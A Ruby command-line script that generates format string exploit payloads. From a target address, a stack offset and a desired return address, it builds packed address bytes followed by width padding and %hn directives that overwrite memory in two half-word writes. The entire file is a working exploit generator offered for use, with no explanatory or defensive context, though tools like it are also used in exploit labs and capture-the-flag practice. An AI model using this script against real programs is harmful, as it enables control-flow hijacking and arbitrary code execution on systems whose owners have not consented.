#!/usr/bin/env ruby

# Yet another format string generator
require 'optparse'

options = {}
OptionParser.new do |opts|
   opts.on("-a", "--address ADDRESS",  "The address you want to overwrite") {|v| options[:address] = v.to_i(16) }
   opts.on("-o", "--offset OFFSET",    "The offset to the stack argument") {|v| options[:offset] = v.to_i }
   opts.on("-r", "--return RETURN",    "The return address to overwrite the value at address with") {|v| options[:return] = v.to_i(16) }
   opts.on("-h", "--help",             "Print this message") do 
      puts opts
      exit
   end
end.parse!

raise OptionParser::MissingArgument if options[:address].nil?
raise OptionParser::MissingArgument if options[:offset].nil?
raise OptionParser::MissingArgument if options[:return].nil?

lword = (options[:return] & 0x0000FFFF)
hword = (options[:return] & 0xFFFF0000) >> 16

fmstr =  [options[:address] + 2].pack('V').each_byte.map {|b| "\\x%02x" % b}.join
fmstr <<  [options[:address]].pack('V').each_byte.map {|b| "\\x%02x" % b}.join

if lword > hword
   fmstr << "%.#{hword - 8}x"
   fmstr << "%#{options[:offset]}$hn"
   fmstr << "%.#{lword - hword}x"
   fmstr << "%#{options[:offset] + 1}$hn"
else
   fmstr << "%.#{lword - 8}x"
   fmstr << "%#{options[:offset] + 1}$hn"
   fmstr << "%.#{hword - lword}x"
   fmstr << "%#{options[:offset]}$hn"
end

puts fmstr
